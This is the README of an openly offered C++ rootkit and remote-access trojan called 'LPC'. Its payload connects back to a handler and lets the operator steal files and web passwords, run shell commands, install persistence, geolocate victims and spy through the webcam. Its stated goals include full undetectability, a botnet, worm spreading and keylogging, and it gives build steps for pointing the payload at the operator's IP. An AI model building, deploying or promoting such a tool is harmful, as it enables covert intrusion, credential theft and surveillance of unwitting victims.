# LPC
## Le petit cheval
Rootkit written in C++ based on socket connection.

2 Executables : The handler and the payload. 
When the payload is executed on the computer's victim, it will try to connect at a special IP:PORT toward the handler.
If it's succesfull you can run several scripts (upload file, download file, screenshot, run shell command, enum web password, put persistence, get external IP, geolocalyze the victim etc...) 

## Final goals :
- Fully undetectable
- Perform stable worked and undetectable scripts
- Manage several clients and create a stable botnet
- Executable must be light
- Worm function
- Keylogger mode

## Getting Started
These instructions will get you a copy of the project up and running on your local machine 
(Later i will make a MakeFile)
### Prerequisites
The Project was made with Visual Studio 2017 so it's recommended to use it, but you can debug and compile the projet with g++. 
First you need to install Visual Studio at least 2017 (Community or Pro)
Then install all the C++ basics tools in Visual Installer (g++, ...)
You will need library : 
- [opencv](https://opencv.org/releases/) to spy the webcam
And you will need to add the bin folder to the Path of Windows (so VC++ can access to it everywhere) 
In Projet properties : 
- Add additional directory
- Add lib to Visual c++ Linker 
- Add Input --> additional file

### How to build the project 
Before building the project, to communicate with the handler you need to put the external IP address of the machine that will be running the handler [Handler](https://github.com/Mathugo/LPC_handler).
It's located in the main function() --> [LPC.cpp](https://github.com/Mathugo/LPC/blob/master/LPC/LPC.cpp)
```
int main()
{
	const char addr[] = "HANDLER IP ADDRESS"; 
	const unsigned short port = HANDLER_PORT;
```
Then build the projet using Visual studio or with g++, example : 
``` 
g++ all_your_cpp_files -o Your_executable
```

## Running the tests
No tests are plannified for the moment

## Contributors
* **Lucien Leseigle**

## Authors
* **Hugo Math**

## Dependency
* **curl.exe** To send mail
* **open_cv** To spy webcam
